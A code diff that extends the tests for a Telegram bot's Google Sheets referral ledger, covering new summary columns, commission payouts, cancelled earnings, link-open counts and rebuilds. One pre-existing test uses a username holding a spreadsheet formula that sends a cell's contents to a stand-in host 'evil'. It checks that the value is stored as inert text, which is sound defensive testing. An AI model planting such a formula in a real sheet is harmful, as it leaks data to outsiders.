@@ -633,10 +633,17 @@ test('a marked question can still be put back deliberately', async () => {
 // what answers "who joined using whose code", and it is the record a payout is
 // made from, so a sale counted twice is money paid twice.
 
-const REFERRAL_HEADERS = ['Code', 'Telegram ID', 'Username', 'Name', 'Status', 'Created At', 'Notes'];
-const LOG_HEADERS = ['Timestamp', 'Code', 'Referrer ID', 'Referrer Username', 'Referred ID',
+/** The original seven columns, as the live sheets were created with. */
+const OLD_REFERRAL_HEADERS = ['Code', 'Telegram ID', 'Username', 'Name', 'Status', 'Created At', 'Notes'];
+const REFERRAL_HEADERS = [...OLD_REFERRAL_HEADERS, 'Share Link', 'Link Opens', 'Opened By (IDs)', 'Joined',
+  'Joined IDs', 'Joined Usernames', 'Total Earned', 'Pending', 'Paid Out', 'Last Joined At', 'Updated At'];
+const OLD_LOG_HEADERS = ['Timestamp', 'Code', 'Referrer ID', 'Referrer Username', 'Referred ID',
   'Referred Username', 'Referred Name', 'Group', 'Payment ID', 'Original Amount', 'Discount',
   'Paid Amount', 'Commission', 'Status', 'Paid At', 'Notes'];
+const LOG_HEADERS = [...OLD_LOG_HEADERS, 'Referral ID', 'Referrer Name', 'Plan'];
+
+/** A column of the Referrals tab, by name. */
+const rc = (header) => REFERRAL_HEADERS.indexOf(header);
 
 /** A book with both referral tabs already present. */
 function referralBook(codes = [], log = []) {
@@ -823,4 +830,151 @@ test('a username that looks like a formula is stored as text', async () => {
   });
   // Written RAW, so the sheet keeps it as characters rather than running it.
   assert.equal(book.Referrals[1][2], '=IMPORTXML("https://evil/"&A1)');
+});
+
+// ---------------------------------------------------------------------------
+// Referral tracking in the sheet itself
+// ---------------------------------------------------------------------------
+// The sheet has to answer "who did this person bring in" on its own, without
+// the dashboard: every inviter's row carries who opened their link, who
+// joined, and what they are owed, rebuilt from the log every time.
+
+test('an old seven-column Referrals tab is upgraded in place, keeping every row', async () => {
+  // Exactly the state the live sheets are in.
+  const book = {
+    Referrals: [OLD_REFERRAL_HEADERS, codeRow('REFAJMXPQ', '111', 'asha')],
+    'Referral Log': [OLD_LOG_HEADERS]
+  };
+  fakeSheets(book);
+
+  const all = await DIRECT.listReferrals(ctx);
+  assert.deepEqual(book.Referrals[0], REFERRAL_HEADERS, 'the header row was not extended');
+  assert.equal(all.length, 1, 'an existing code was lost in the upgrade');
+  assert.equal(all[0].code, 'REFAJMXPQ');
+  assert.equal(all[0].telegram_id, '111');
+});
+
+test('a join rewrites the inviter\'s row with who joined, and what they are owed', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
+  fakeSheets(book);
+
+  for (const [id, user, pay] of [['222', 'ravi', 'pay_1'], ['333', 'meena', 'pay_2']]) {
+    await DIRECT.recordReferralEarning(ctx, {
+      code: 'REFAJMXPQ', referrer_telegram_id: '111', referrer_username: 'asha', referrer_name: 'Asha K',
+      referred_telegram_id: id, referred_username: user, referred_name: user.toUpperCase(),
+      group: 'Newspaper · English', payment_id: pay, plan: 'lifetime_pass',
+      original_paise: 19900, discount_paise: 1990, paid_paise: 17910, commission_paise: 3582
+    });
+  }
+
+  const row = book.Referrals[1];
+  assert.equal(row[rc('Joined')], 2);
+  assert.equal(row[rc('Joined IDs')], '222, 333', 'the sheet does not say who joined');
+  assert.equal(row[rc('Joined Usernames')], '@ravi, @meena');
+  assert.equal(row[rc('Total Earned')], 71.64);
+  assert.equal(row[rc('Pending')], 71.64);
+  assert.equal(row[rc('Paid Out')], 0);
+  assert.match(String(row[rc('Last Joined At')]), /IST$/);
+});
+
+test('every log row gets its own referral id, the inviter\'s name and the pass', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
+  fakeSheets(book);
+  for (const pay of ['pay_1', 'pay_2']) {
+    await DIRECT.recordReferralEarning(ctx, {
+      code: 'REFAJMXPQ', referrer_telegram_id: '111', referrer_name: 'Asha K',
+      referred_telegram_id: pay, payment_id: pay, plan: 'lifetime_pass', commission_paise: 3582
+    });
+  }
+  const log = book['Referral Log'];
+  const lc = (h) => LOG_HEADERS.indexOf(h);
+  assert.equal(log[1][lc('Referral ID')], 'RL-0001');
+  assert.equal(log[2][lc('Referral ID')], 'RL-0002');
+  assert.equal(log[1][lc('Referrer Name')], 'Asha K');
+  assert.equal(log[1][lc('Plan')], 'lifetime_pass');
+});
+
+test('paying an inviter moves their money from Pending to Paid Out in the sheet', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')], [
+    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
+    logRow('REFAJMXPQ', '111', '333', 'pay_2', 35.82)
+  ]);
+  fakeSheets(book);
+
+  await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', ['pay_1']);
+  const row = book.Referrals[1];
+  assert.equal(row[rc('Pending')], 35.82);
+  assert.equal(row[rc('Paid Out')], 35.82);
+  assert.equal(row[rc('Total Earned')], 71.64, 'paying out does not change what was earned');
+});
+
+test('a cancelled earning drops out of the counts and the ids', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')], [
+    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
+    logRow('REFAJMXPQ', '111', '333', 'pay_2', 35.82, 'cancelled')
+  ]);
+  fakeSheets(book);
+  await DIRECT.rebuildReferralSummaries(ctx);
+  assert.equal(book.Referrals[1][rc('Joined')], 1);
+  assert.equal(book.Referrals[1][rc('Joined IDs')], '222');
+});
+
+test('each person who opens a link is counted once, and the owner never', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
+  fakeSheets(book);
+
+  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '222')).opens, 1);
+  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '222')).recorded, false,
+    'the same person tapping twice is still one open');
+  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '333')).opens, 2);
+  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '111')).recorded, false,
+    'the owner opening their own link is not a visitor');
+  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFNOPE22', '444')).recorded, false);
+
+  assert.equal(book.Referrals[1][rc('Link Opens')], 2);
+  assert.equal(book.Referrals[1][rc('Opened By (IDs)')], '222, 333');
+});
+
+test('rebuilding every summary repairs rows made before the summary existed', async () => {
+  const book = referralBook(
+    [codeRow('REFAJMXPQ', '111', 'asha'), codeRow('REFWMXD9N', '444', 'kiran')],
+    [logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
+     logRow('REFWMXD9N', '444', '555', 'pay_2', 40, 'paid')]
+  );
+  fakeSheets(book);
+
+  const result = await DIRECT.rebuildReferralSummaries(ctx);
+  assert.equal(result.rebuilt, 2);
+  assert.equal(book.Referrals[1][rc('Joined IDs')], '222');
+  assert.equal(book.Referrals[2][rc('Joined IDs')], '555');
+  assert.equal(book.Referrals[2][rc('Paid Out')], 40);
+  assert.equal(book.Referrals[2][rc('Pending')], 0);
+});
+
+test('a new code is created with its share link and a zeroed summary', async () => {
+  const book = {};
+  fakeSheets(book);
+  await DIRECT.createReferral(ctx, {
+    telegram_id: '111', username: 'asha', code: 'REFAJMXPQ',
+    share_link: 'https://t.me/appscpaymentsbot?start=ref_REFAJMXPQ'
+  });
+  const row = book.Referrals[1];
+  assert.equal(row[rc('Share Link')], 'https://t.me/appscpaymentsbot?start=ref_REFAJMXPQ');
+  assert.equal(row[rc('Joined')], 0);
+  assert.equal(row[rc('Link Opens')], 0);
+});
+
+test('a rebuild fills in blank share links and open counts, and never overwrites a link', async () => {
+  const book = referralBook([
+    codeRow('REFAJMXPQ', '111', 'asha'),
+    [...codeRow('REFWMXD9N', '222', 'ravi'), 'https://t.me/oldbot?start=ref_REFWMXD9N', 3, '1, 2, 3']
+  ]);
+  fakeSheets(book);
+  await DIRECT.rebuildReferralSummaries(ctx, { botUsername: '@appscpaymentsbot' });
+
+  assert.equal(book.Referrals[1][rc('Share Link')], 'https://t.me/appscpaymentsbot?start=ref_REFAJMXPQ');
+  assert.equal(book.Referrals[1][rc('Link Opens')], 0);
+  assert.equal(book.Referrals[2][rc('Share Link')], 'https://t.me/oldbot?start=ref_REFWMXD9N',
+    'a link the member already sent was overwritten');
+  assert.equal(book.Referrals[2][rc('Link Opens')], 3);
 });
